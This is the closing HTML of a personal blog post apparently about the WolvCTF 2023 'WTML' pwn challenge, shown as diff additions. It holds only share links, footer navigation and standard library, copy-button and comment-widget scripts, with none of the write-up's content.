+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&text=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&is_video=false&description=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WolvCTF 2023 - WTML (pwn, oob)&body=Check out this article: https://jiravvit.github.io/230322-wolvctf2023-WTML/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&name=WolvCTF 2023 - WTML (pwn, oob)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230322-wolvctf2023-WTML/&t=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
